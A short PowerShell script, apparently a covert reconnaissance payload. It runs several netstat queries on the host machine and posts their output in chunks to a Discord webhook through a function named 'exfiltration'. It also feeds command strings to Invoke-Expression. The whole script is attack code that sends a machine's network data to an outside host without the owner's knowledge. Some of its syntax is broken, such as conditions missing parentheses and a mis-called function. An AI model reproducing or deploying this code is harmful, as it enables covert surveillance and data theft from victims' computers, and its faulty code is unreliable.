
# Discord send function
function exfiltration ($command, $text) {
	# Loop for Discord
	$ConstantLimitForRestMethod = 1999
	$TMP_Body = @{
		'username' = $command
		'content' = ""
	}
	for($i = 0; $i -lt $text.Length; $i+=$ConstantLimitForRestMethod){
		try {
			$TMP_Body = @{
				'username' = $command
				'content' = $text.Substring($i, $ConstantLimitForRestMethod)
			}
		} catch [ArgumentOutOfRangeException] {
			if($text.Length-$i -gt 0){
				$TMP_Body = @{
				'username' = $command
				'content' = $text.Substring($i, $text.Length-$i)
				}
			} else {
				break
			}
		}
		Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($TMP_Body | ConvertTo-Json)
	}
}

# send command format
function send_command($command){
	$out = Invoke-Expression $command
	exfiltration($command, $out)
}

# Discord Connection
$hookurl = "$discord"

# Settings
if $d -eq "1" {
	send_command("netstat")
}

if $r -eq "1" {
	send_command("netstat -r")
}

if $lc -eq "1" {
	send_command("netstat -af")
}
if $ln -eq "1" {
	send_command("netstat -an")
}
if $ac -eq "1" {
	send_command("netstat -qf")
}
if $an -eq "1" {
	send_command("netstat -qn")
}
if $o -eq "1" {
	send_command("netstat -t")
}
if $p -ne ""{
	# format $proto="TCP"
	$cmd = "netstat -ps " + $p
	send_command($cmd)
}